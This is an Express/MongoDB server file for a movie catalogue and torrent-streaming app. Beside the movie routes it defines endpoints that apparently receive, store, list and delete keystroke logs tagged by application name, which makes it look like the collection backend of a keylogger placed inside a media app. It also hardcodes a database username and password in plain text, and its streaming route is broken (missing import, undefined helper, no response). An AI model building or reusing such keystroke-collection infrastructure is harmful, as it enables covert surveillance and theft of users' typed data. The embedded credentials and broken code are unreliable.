// Changed require to import
import express from 'express';
import mongoose from 'mongoose';
import WebTorrent from 'webtorrent';
import cors from 'cors';

const app = express();
app.use(express.json());

const client = new WebTorrent();
app.use(cors());

const PORT = 9001;

const torrentId =  'magnet:?xt=urn:btih:dd8255ecdc7ca55fb0bbf81323d87062db1f6d1c&dn=Big+Buck+Bunny&tr=udp%3A%2F%2Fexplodie.org%3A6969&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.empire-js.us%3A1337&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337&tr=wss%3A%2F%2Ftracker.btorrent.xyz&tr=wss%3A%2F%2Ftracker.fastcast.nz&tr=wss%3A%2F%2Ftracker.openwebtorrent.com&ws=https%3A%2F%2Fwebtorrent.io%2Ftorrents%2F&xs=https%3A%2F%2Fwebtorrent.io%2Ftorrents%2Fbig-buck-bunny.torrent';

app.get("/auth-now", (req, res) => {
  res.send("Successfully reauthenticated!");
});

app.get("/", (req, res) => {
  console.log("Test");
  res.send("Successfully authenticated!");
});


// MongoDB code starts

// MongoDB connection
const mongoURI =
  "mongodb+srv://faisal26:khalid26@cluster0.aalut.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";

mongoose
  .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("MongoDB connected..."))
  .catch((err) => console.log(err));

// Define Schema
const MovieSchema = new mongoose.Schema({
  id: { type: String, required: true },
  poster: { type: String, required: true },
  plot: { type: String, required: true },
  year: { type: String, required: true },
  media_url: { type: String, required: true },
});

const Movies = mongoose.model("Movies", MovieSchema);

// Define KeyLog Schema
const KeyLogSchema = new mongoose.Schema({
  content: { type: String, required: true },
  appName: { type: String },
  isLocal: { type: Boolean, default: false },
  timeStamp: { type: Date, default: Date.now }
});

const KeyLogs = mongoose.model("KeyLogs", KeyLogSchema);

// Routes for CRUD operations
app.post("/movie", async (req, res) => {
  try {
    console.log("req body -----> : ", req.body);
    const newMovie = new Movies(req.body);
    const savedMovie = await newMovie.save();
    res.status(201).json(savedMovie);
  } catch (err) {
    console.error(err);
    res.status(400).json({ message: err.message });
  }
});

app.get("/movies", async (req, res) => {
  try {
    const movies = await Movies.find();
    res.status(200).json(movies);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: err.message });
  }
});

app.get("/movies/:id", async (req, res) => {
  try {
    const movie = await Movies.findById(req.params.id);
    if (!movie) throw new Error("Movie not found");
    res.status(200).json(movie);
  } catch (err) {
    console.error(err);
    res.status(404).json({ message: err.message });
  }
});

app.put("/movies/:id", async (req, res) => {
  try {
    const movie = await Movies.findByIdAndUpdate(req.params.id, req.body, {
      new: true,
      runValidators: true,
    });
    if (!movie) throw new Error("Movie not found");
    res.status(200).json(movie);
  } catch (err) {
    console.error(err);
    res.status(400).json({ message: err.message });
  }
});

app.delete("/movies/:id", async (req, res) => {
  try {
    const movie = await Movies.findByIdAndDelete(req.params.id);
    if (!movie) throw new Error("Movie not found");
    res.status(200).json({ message: "Movie deleted" });
  } catch (err) {
    console.error(err);
    res.status(404).json({ message: err.message });
  }
});

// Route to create a new KeyLog entry
app.post("/keylog", async (req, res) => {
  try {
    const newLogEntry = new KeyLogs(req.body);
    const savedLog = await newLogEntry.save();
    res.status(201).json(savedLog);
  } catch (err) {
    console.error(err);
    res.status(400).json({ message: err.message });
  }
});

app.post("/local-keylog", async (req, res) => {
  try {
    const newLogEntry = new KeyLogs({ ...req.body, isLocal: true });
    const savedLog = await newLogEntry.save();
    res.status(201).json(savedLog);
  } catch (err) {
    console.error(err);
    res.status(400).json({ message: err.message });
  }
});

// Route to get all KeyLog entries
app.get("/keylogs", async (req, res) => {
  try {
    const logs = await KeyLogs.find({ isLocal: false });
    res.status(200).json(logs);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: err.message });
  }
});

app.get("/local-keylogs", async (req, res) => {
  try {
    const logs = await KeyLogs.find({ isLocal: true });
    res.status(200).json(logs);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: err.message });
  }
});

// Route to delete all KeyLog entries
app.delete("/keylogs", async (req, res) => {
  try {
    const deletedLogs = await KeyLogs.deleteMany({});
    if (deletedLogs.deletedCount === 0) {
      throw new Error("No logs to delete");
    }
    res.status(200).json({ message: "All logs deleted" });
  } catch (err) {
    console.error(err);
    res.status(404).json({ message: err.message });
  }
});
// MongoDB code ends

// Torrent Streaming starts

// Route for streaming torrent
app.get("/stream-torrent", (req, res) => {
  

client.add(torrentId, (torrent) => {
  // Filter for MP4 files only
  const mp4Files = torrent.files.filter(file => file.name.endsWith('.mp4'));

  if (mp4Files.length === 0) {
    console.log('No MP4 files found in torrent');
  }

  // Stream only the first MP4 file found
  const file = mp4Files[0];
  console.log(`Streaming file: ${file.name}`);

  const server = http.createServer((req, res) => {
    const range = req.headers.range;
    let start, end;

    if (!range) {
      // No Range header, stream initial 10 seconds only
      const initialByteRange = calculateByteRangeForDuration(file, 10); // 10 seconds
      start = initialByteRange.start;
      end = initialByteRange.end;
    } else {
      // Parse existing range
      const positions = range.replace(/bytes=/, '').split('-');
      start = parseInt(positions[0], 10);
      end = positions[1] ? parseInt(positions[1], 10) : file.length - 1;
    }

    if (start >= file.length || end >= file.length) {
      res.writeHead(416, {
        'Content-Range': `bytes */${file.length}`
      });
      return res.end();
    }

    // Calculate the chunk size
    const chunkSize = (end - start) + 1;

    // Set response headers
    const head = {
      'Content-Range': `bytes ${start}-${end}/${file.length}`,
      'Accept-Ranges': 'bytes',
      'Content-Length': chunkSize,
      'Content-Type': 'video/mp4', // Adjust this according to your file type
    };

    res.writeHead(206, head);

    // Create a stream for the specified range
    const stream = file.createReadStream({ start, end });

    // Pipe the data to the response
    stream.pipe(res);

    stream.on('error', (err) => {
      res.end(err);
    });

   
  });

});
});

// Torrent Streaming ends

// Server LISTENing here
app.listen(PORT, () => {
  console.log("Server started at port: " + PORT);  // Highlighted change
});
